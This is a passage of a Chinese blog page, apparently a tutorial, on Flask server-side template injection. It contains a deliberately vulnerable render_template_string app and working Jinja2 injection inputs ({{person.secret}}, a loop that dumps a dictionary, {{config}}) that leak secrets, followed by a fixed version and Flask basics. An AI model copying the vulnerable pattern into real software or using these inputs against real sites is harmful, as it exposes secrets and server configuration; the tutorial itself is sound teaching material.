@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>flask SSTI漏洞 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="flask SSTI漏洞" />
+<meta property="og:description" content="文章目录 第一章 Flask ssti漏洞的代码（长什么样子）1.1 代码1.2 正常测试1.3 利用漏洞测试1.3.1 获取字典中的密钥1.3.2 获取整个person 字典中的内容1.3.3 获取服务器端敏感的配置参数 1.4 预防敏感信息泄露 第二章 前言（基础知识储备）2.1 flask基础2.2 程序分析2.3 注册路由2.4 装饰器2.5 本地运行程序2.6 Flask变量规则2.7 渲染方法 第三章 服务器端模板（SST）3.1 为什么需要服务器端模板（SST)(why)3.2 什么是服务器端模板（SST)（what) 第四章 服务器模板注入（SSTI）4.1 什么是服务器模板注入4.2 模板注入原理4.3 模板注入检测 第五章 例子（CTF)5.1 构造payload5.2这个题目是TWCTF的题目，源码如下 第五章 如何防御服务器模板注入参考资料附录 第一章 Flask ssti漏洞的代码（长什么样子） 1.1 代码 from flask import Flask from flask import request from flask import render_template_string from flask import render_template app = Flask(__name__) @app.route(&#39;/login&#39;) def hello_ssti(): person = { &#39;name&#39;: &#39;hello&#39;, &#39;secret&#39;: &#39;7d793037a0760186574b0282f2f435e7&#39; } if request." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/4fa79af3f7fff23a01582004cb96ef00/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-08-07T16:36:11+08:00" />
+<meta property="article:modified_time" content="2020-08-07T16:36:11+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">flask SSTI漏洞</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p></p> 
+<div class="toc"> 
+ <h4>文章目录</h4> 
+ <ul><li><a href="#_Flask_ssti_1" rel="nofollow">第一章 Flask ssti漏洞的代码（长什么样子）</a></li><li><ul><li><a href="#11__2" rel="nofollow">1.1 代码</a></li><li><a href="#12__29" rel="nofollow">1.2 正常测试</a></li><li><a href="#13__46" rel="nofollow">1.3 利用漏洞测试</a></li><li><ul><li><a href="#131__47" rel="nofollow">1.3.1 获取字典中的密钥</a></li><li><a href="#132_person__53" rel="nofollow">1.3.2 获取整个person 字典中的内容</a></li><li><a href="#133__63" rel="nofollow">1.3.3 获取服务器端敏感的配置参数</a></li></ul> 
+   </li><li><a href="#14__68" rel="nofollow">1.4 预防敏感信息泄露</a></li></ul> 
+  </li><li><a href="#__106" rel="nofollow">第二章 前言（基础知识储备）</a></li><li><ul><li><a href="#21_flask_107" rel="nofollow">2.1 flask基础</a></li><li><a href="#22__154" rel="nofollow">2.2 程序分析</a></li><li><a href="#23__167" rel="nofollow">2.3 注册路由</a></li><li><a href="#24__181" rel="nofollow">2.4 装饰器</a></li><li><a href="#25__217" rel="nofollow">2.5 本地运行程序</a></li><li><a href="#26_Flask_232" rel="nofollow">2.6 Flask变量规则</a></li><li><a href="#27__257" rel="nofollow">2.7 渲染方法</a></li></ul> 
+  </li><li><a href="#_SST_386" rel="nofollow">第三章 服务器端模板（SST）</a></li><li><ul><li><a href="#31_SSTwhy_387" rel="nofollow">3.1 为什么需要服务器端模板（SST)(why)</a></li><li><a href="#32_SSTwhat_406" rel="nofollow">3.2 什么是服务器端模板（SST)（what)</a></li></ul> 
+  </li><li><a href="#_SSTI_428" rel="nofollow">第四章 服务器模板注入（SSTI）</a></li><li><ul><li><a href="#41__429" rel="nofollow">4.1 什么是服务器模板注入</a></li><li><a href="#42__433" rel="nofollow">4.2 模板注入原理</a></li><li><a href="#43__500" rel="nofollow">4.3 模板注入检测</a></li></ul> 
+  </li><li><a href="#_CTF_551" rel="nofollow">第五章 例子（CTF)</a></li><li><ul><li><a href="#51_payload_629" rel="nofollow">5.1 构造payload</a></li><li><a href="#52TWCTF_697" rel="nofollow">5.2这个题目是TWCTF的题目，源码如下</a></li></ul> 
+  </li><li><a href="#__771" rel="nofollow">第五章 如何防御服务器模板注入</a></li><li><a href="#_777" rel="nofollow">参考资料</a></li><li><a href="#_792" rel="nofollow">附录</a></li></ul> 
+</div> 
+<p></p> 
+<h2><a id="_Flask_ssti_1"></a>第一章 Flask ssti漏洞的代码（长什么样子）</h2> 
+<h3><a id="11__2"></a>1.1 代码</h3> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_ssti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    person <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>
+        <span class="token string">'secret'</span><span class="token punctuation">:</span> <span class="token string">'7d793037a0760186574b0282f2f435e7'</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token comment">#获取查询参数name的值</span>
+
+    template <span class="token operator">=</span> <span class="token string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> <span class="token operator">%</span> person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">,</span> person<span class="token operator">=</span>person<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<h3><a id="12__29"></a>1.2 正常测试</h3> 
+<p>运行上面这段代码，并在浏览器中访问 http://127.0.0.1:5000/login ,显示的结果为:</p> 
+<p><img src="https://images2.imgbox.com/93/c0/wniL2zmY_o.png" alt="在这里插入图片描述"></p> 
+<p>然后我们尝试一些良性的输入，访问 http://127.0.0.1:5000/login?name =flask ,结果为:</p> 
+<p><img src="https://images2.imgbox.com/31/67/u1bEL3h0_o.png" alt="在这里插入图片描述"></p> 
+<p>渲染过程如下，render_tempalte()函数的第一个参数为渲染目标的HTML字符串、第二个参数为需要加载到字符串指定标签位置的内容：</p> 
+<p>其实render_template()的功能时先引入template，同时根据后门传入的参数，对template进行修改渲染</p> 
+<p><img src="https://images2.imgbox.com/df/ae/R5uNfIu4_o.png" alt="在这里插入图片描述"></p> 
+<h3><a id="13__46"></a>1.3 利用漏洞测试</h3> 
+<h4><a id="131__47"></a>1.3.1 获取字典中的密钥</h4> 
+<p>下面演示一些攻击者的输入，比如访问 http://127.0.0.1:5000/ login?name=flask{<!-- -->{person.secret}} ，你会发现页面中除了显示了 Hello flask！之外，连同秘钥也一起被显示了。</p> 
+<p><img src="https://images2.imgbox.com/87/9d/NXUfltmd_o.png" alt="在这里插入图片描述"></p> 
+<h4><a id="132_person__53"></a>1.3.2 获取整个person 字典中的内容</h4> 
+<p>由于在模板中使用的是 % 字符串模板，所以它对任何传递给 python 表达式的内容进行了求值。在 Flask 模板语言中，我们传递了 {<!-- -->{person.secret}}，它对字典 person 中保密的键值进行了求值，这泄露了应用程序的秘钥。<br> 我们还可以执行更强大的攻击，访问 http://127.0.0.1:5000/ login?name={% for item in person %}{<!-- -->{item, person[item]}} {% end for%}，你会发现整个 person 字典中的内容全被显示在页面中了。</p> 
+<p><img src="https://images2.imgbox.com/9a/09/q3uV5VVs_o.png" alt="在这里插入图片描述"></p> 
+<p>如果不加{% endfor %}，会报错</p> 
+<p><img src="https://images2.imgbox.com/c3/16/hUpnfg0L_o.png" alt="在这里插入图片描述"></p> 
+<h4><a id="133__63"></a>1.3.3 获取服务器端敏感的配置参数</h4> 
+<p>即使攻击者想要获取服务器端敏感的配置参数，也可以通过 {<!-- -->{ config }} 的名称采纳数来获取，访问 http://127.0.0.1:5000/login?name= {<!-- -->{%20config%20}}，你会发现服务器的配置显示在页面中了。</p> 
+<p><img src="https://images2.imgbox.com/51/49/dGEwxJJ0_o.png" alt="在这里插入图片描述"></p> 
+<h3><a id="14__68"></a>1.4 预防敏感信息泄露</h3> 
+<p>那么如何避免敏感信息泄露呢？在这个情况下，解决的方法是使用模板中我们需要的特定变量，而不是直接使用 %s。 比如我们将 flask 代码改为:</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_ssti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    person <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'world'</span><span class="token punctuation">,</span>
+        <span class="token string">'secret'</span><span class="token punctuation">:</span> <span class="token string">'7d793037a0760186574b0282f2f435e7'</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        person<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>
+
+    template <span class="token operator">=</span> <span class="token string">'&lt;h2&gt;Hello {<!-- -->{ person.name }}!&lt;/h2&gt;'</span>
+
+    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">,</span> person<span class="token operator">=</span>person<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<ul><li> <p>Serving Flask app “<strong>main</strong>” (lazy loading)</p> </li><li> <p>Environment: production<br> WARNING: This is a development server. Do not use it in a production deployment.<br> Use a production WSGI server instead.</p> </li><li> <p>Debug mode: off</p> </li><li> <p>Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)<br> 然后我们在尝试访问 http://127.0.0.1:5000/login?name={<!-- -->{%20config%20}}，你会发现显示的结果只是字符串 {<!-- -->{ config }}，而没有服务器的敏感信息了。<br> <img src="https://images2.imgbox.com/b8/a9/IrIHq5Hj_o.png" alt="在这里插入图片描述"></p> </li></ul> 
+<h2><a id="__106"></a>第二章 前言（基础知识储备）</h2> 
+<h3><a id="21_flask_107"></a>2.1 flask基础</h3> 
+<p>Flask是一个用Python编写的Web应用程序框架。Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。<br> WSGI</p> 
+<p>Web Server Gateway Interface（Web服务器网关接口，WSGI）已被用作Python Web应用程序开发的标准。 WSGI是Web服务器和Web应用程序之间通用接口的规范。</p> 
+<p>Werkzeug<br> 它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p> 
+<p>jinja2<br> jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p> 
+<p>在学习SSTI之前，先把flask的运作流程搞明白。这样有利用更快速的理解原理。</p> 
+<p>先看一段python代码，简单的实现了一个输出hello word的web程序。</p> 
+<pre><code class="prism language-python"><span class="token comment">#从Flask框架中导入Flask类</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+ 传入_name_初始化一个Flask实例
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+ 这个路由将根URL映射到了hello_world函数上
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>  <span class="token comment">#route装饰器的作用是将函数与url绑定起来,这里的作用就是当访问http://127.0.0.1:5000/的时候，flask会返回hello word</span>
+<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment">#定义视图函数</span>
+    <span class="token keyword">return</span> <span class="token string">"&lt;h1&gt;Hello World!&lt;/h1&gt;"</span>   <span class="token comment">#返回响应对象</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token comment">#指定默认主机为是127.0.0.2，port为9999,默认是127.0.0.1:5555</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"127.0.0.2"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">)</span>
+</code></pre> 
+<ul><li> <p>Serving Flask app “<strong>main</strong>” (lazy loading)</p> </li><li> <p>Environment: production<br> WARNING: This is a development server. Do not use it in a production deployment.<br> Use a production WSGI server instead.</p> </li><li> <p>Debug mode: off</p> </li><li> <p>Running on http://127.0.0.2:9999/ (Press CTRL+C to quit)<br> 127.0.0.1 - - [03/Jul/2020 16:30:15] “[37mGET / HTTP/1.1[0m” 200 -<br> 127.0.0.1 - - [03/Jul/2020 16:30:15] “[33mGET /favicon.ico HTTP/1.1[0m” 404 –</p> </li></ul> 
+<p>输出结果:<br> hello world</p> 
+<h3><a id="22__154"></a>2.2 程序分析</h3> 
+<p>所有的Flask程序都必须创建一个程序实例。Web服务器使用一种名为Web服务器网关接口（Web Server Gateway Interface，WSGI）的协议，把接收自客户端的所有请求都转给这个对象进行处理。程序实例是Flask类的对象，经常使用下述代码创建：</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+</code></pre> 
+<pre><code>from flask import Flask这行代码表示从flask包导入Flask类，这个类表示一个Flask程序。实例化这个类，就得到我们的程序实例app;  
+app=Flask(__name__)这行代码表示传入__name__这个变量值来初始化Flask对象app，Flask用这个参数确定程序的根目录，__name__代表的是这个模块本身的名称。python会根据所处的模块来赋予_name_变量相应的值，对于特定的程序，比如（app.py),这个值为app。
+</code></pre> 
+<h3><a id="23__167"></a>2.3 注册路由</h3> 
+<p><img src="https://images2.imgbox.com/48/75/rP4zxalr_o.png" alt="在这里插入图片描述"></p> 
+<p>第一步：用户在浏览器输入URL访问某个资源；<br> 第二步：Flask接受用户请求并分析请求的URL；<br> 第三步：为这个URL找到对应的处理函数；<br> 第四步：执行函数并生成响应，返回给浏览器；<br> 第五步：浏览器接收并解析响应，将信息显示在页面中。</p> 
+<p>上面这些步骤中，大部分都由Flask完成，我们要做的只是建立处理请求的函数，并为其定义对应的URL规则。只需为函数附加app.route()装饰器，并传入URL规则作为参数，我们就可以让URL与函数建立关联。这个过程我们称之为注册路由，路由否则管理URL和函数之间的映射，而这个函数则称为视图函数。</p> 
+<p>路由的含义：顾名思义，“按照某线路发送”，即调用与请求URL对应的视图函数。</p> 
+<h3><a id="24__181"></a>2.4 装饰器</h3> 
+<pre><code>Flask类的route()函数是一个装饰器，它告诉应用程序哪个URL应该调用相关的函数。
+</code></pre> 
+<p>app.route(rule, options)<br> • rule 参数表示与该函数的URL绑定。<br> • options 是要转发给基础Rule对象的参数列表。</p> 
+<p>在上面的示例中，’/ ’ URL与hello_world()函数绑定。因此，当在浏览器中打开web服务器的主页时，将呈现该函数的输出。<br> 比如修改rule</p> 
+<pre><code class="prism language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>‘<span class="token operator">/</span>hello’<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> ‘hello world’
+</code></pre> 
+<p>在这里，URL ‘/ hello’ 规则绑定到hello_world()函数。 因此，如果用户访问http：// localhost：5000 / hello URL，hello_world()函数的输出将在浏览器中呈现。</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"hello world!"</span>
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<ul><li> <p>Serving Flask app “<strong>main</strong>” (lazy loading)</p> </li><li> <p>Environment: production<br> WARNING: This is a development server. Do not use it in a production deployment.<br> Use a production WSGI server instead.</p> </li><li> <p>Debug mode: off</p> </li><li> <p>Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)</p> </li></ul> 
+<h3><a id="25__217"></a>2.5 本地运行程序</h3> 
+<p>Flask类的run()方法在本地开发服务器上运行应用程序。<br> app.run(host, port, debug, options)<br> 所有参数都是可选的</p> 
+<p>调试模式<br> 通过调用run()方法启动Flask应用程序。但是，当应用程序正在开发中时，应该为代码中的每个更改手动重新启动它。为避免这种不便，请启用调试支持。如果代码更改，服务器将自行重新加载。它还将提供一个有用的调试器来跟踪应用程序中的错误（如果有的话）。<br> 在运行或将调试参数传递给run()方法之前，通过将application对象的debug属性设置为True来启用Debug模式。</p> 
+<pre><code class="prism language-python">app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<h3><a id="26_Flask_232"></a>2.6 Flask变量规则</h3> 
+<p>通过向规则参数添加变量部分，可以动态构建URL。此变量部分标记为。它作为关键字参数传递给与规则相关联的函数。<br> 在以下示例中，route()装饰器的规则参数包含附加到URL '/hello’的。因此，如果在浏览器中输入http://127.0.0.1:5000/hello/humen作为URL ，则’humen’将作为参数提供给hello()函数。</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name&gt;'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> <span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<ul><li> <p>Serving Flask app “<strong>main</strong>” (lazy loading)</p> </li><li> <p>Environment: production<br> WARNING: This is a development server. Do not use it in a production deployment.<br> Use a production WSGI server instead.</p> </li><li> <p>Debug mode: off</p> </li><li> <p>Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)</p> </li></ul> 
+<h3><a id="27__257"></a>2.7 渲染方法</h3> 
+<p>2.7.1 模板与静态文件</p> 
+<p>一个完整的网站当然不能只返回用户一句“hello,world!"，我们需要模板（template)和静态文件（static file)来生成更加丰富的网页。模板即包含程序页面的HTML文件，静态文件则是需要在HTML文件中加载的CSS和JavaScript文件，以及图片、字体文件等资源文件。默认情况下，模板文件存放在项目根目录中的templates文件中，静态文件存放在static文件夹下，这两个文件夹需要和包含程序实例的模块处于同一个目录下，对应的项目节格示例如下所示：</p> 
+<pre><code class="prism language-cmd">hello/
+    - templates/
+        - hello.html
+    - static/
+        - hello.js
+        - hello.css
+    - app.py
+</code></pre> 
+<p>在下面的示例中，在index.html中的HTML按钮的OnClick事件上调用hello.js中定义的javascript函数，该函数在Flask应用程序的“/”URL上呈现。</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>index.html的HTML脚本如下所示：</p> 
+<pre><code class="prism language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span>
+         <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>{<!-- -->{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename = <span class="token punctuation">'</span>hello.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>sayHello()<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>Say Hello<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre> 
+<p>Hello.js包含sayHello()函数。</p> 
+<pre><code class="prism language-javascript"><span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+   <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>flask模块的渲染方法有render_template和render_template_string两种。</p> 
+<p>2.7.2 render_template()<br> render_template()是用来渲染一个指定的文件的。使用如下<br> 因为，从Python代码生成HTML内容很麻烦，尤其是在需要放置变量数据和Python语言元素（如条件或循环）时。这需要经常从HTML中转义。<br> 这是可以利用Flask所基于的Jinja2模板引擎的地方。而不是从函数返回硬编码HTML，可以通过render_template()函数呈现HTML文件。</p> 
+<pre><code class="prism language-html">return render_template('index.html')
+</code></pre> 
+<p>2.7.3 render_template_string()</p> 
+<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。</p> 
+<pre><code class="prism language-html">html = '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>This is index page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>'
+return render_template_string(html)
+</code></pre> 
+<p>2.7.4 模版<br> flask是使用Jinja2来作为渲染引擎的。<br> Jinja2模板引擎使用以下分隔符从HTML转义。</p> 
+<pre><code class="prism language-html">•	{% ... %}用于语句
+•	{<!-- -->{ ... }}用于表达式可以打印到模板输出
+•	{# ... #}用于未包含在模板输出中的注释
+•	#... ##用于行语句
+</code></pre> 
+<p>在网站的根目录下新建templates文件夹，这里是用来存放html文件，也就是模板文件。<br> 模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。<br> app.py内容如下：</p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">"This is any page."</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>/templates/hello.html的内容为：</p> 
